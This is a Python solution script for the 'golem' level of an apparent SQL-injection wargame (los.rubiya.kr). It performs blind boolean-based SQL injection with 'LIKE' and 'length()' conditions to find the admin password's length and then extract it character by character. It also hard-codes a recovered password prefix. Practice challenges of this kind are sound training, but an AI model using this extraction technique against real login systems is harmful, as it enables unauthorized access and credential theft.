import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"

pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        res = make_request(chall_url,
                           "?pw=" + urllib.parse.quote(f"' || id like 'admin' && pw like '{prefix}{c}%' -- -"))
        if hello_admin in res:
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 8
prefix = "77d6290b"

if pw_len is None:
    for i in range(40):
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' || id like 'admin' && length(pw) < {i} -- -"))
        if hello_admin in res:
            print("Found pw length:", i - 1)
            pw_len = i - 1
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
